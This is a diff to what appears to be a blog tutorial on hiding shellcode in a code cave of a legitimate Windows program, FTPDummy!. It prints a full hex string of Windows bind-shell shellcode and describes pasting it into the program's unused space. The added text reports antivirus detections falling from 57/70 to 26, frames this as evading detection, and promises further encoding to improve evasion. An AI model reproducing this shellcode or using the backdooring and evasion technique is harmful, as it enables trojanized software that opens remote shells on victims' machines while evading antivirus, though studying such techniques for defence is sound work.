@@ -100,6 +100,10 @@ Final size of hex file: 656 bytes
 fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d6833320000687773325f54684c772607ffd5b89001000029c454506829806b00ffd56a085950e2fd4050405068ea0fdfe0ffd597680200232889e66a10565768c2db3767ffd55768b7e938ffffd5576874ec3be1ffd5579768756e4d61ffd568636d640089e357575731f66a125956e2fd66c744243c01018d442410c60044545056565646564e565653566879cc3f86ffd589e04e5646ff306808871d60ffd5bbf0b5a25668a695bd9dffd53c067c0a80fbe07505bb4713726f6a0053ffd5
 ```
 
+If this program on exe format is submitted to Virus Total, it gives the following result.
+
+![](/assets/img/Code_Cave/payload_detected.png)
+
 The empty space is selected and a binary paste is arranged.
 
 ![](/assets/img/Code_Cave/12.png)
@@ -179,3 +183,15 @@ Note: In these scenarios, a sign that the alignment was issued with no mistakes 
 If the program is run and the flow continues (SHIFT+F9), we see that the bind shellcode is arranged and FTPDummy! boots up when it is interacted with the shellcode.
 
 ![](/assets/img/Code_Cave/28.png)
+
+#### Escaping from the cat.
+
+Remember, when we first scanned our payload through Virus Total, it gave a result of 57/70. Let's check how many AV Software manages to flag our new PE File as malware.
+
+![](/assets/img/Code_Cave/29.png)
+
+Even though there is much to work, from 57 to 26 is a great improvement. On the following post i will be explaining this same technique on more profound sections of the program with encoding as well.
+
+Here is the PoC for you to enjoy.
+
+![](/assets/img/Code_Cave/poc.png)
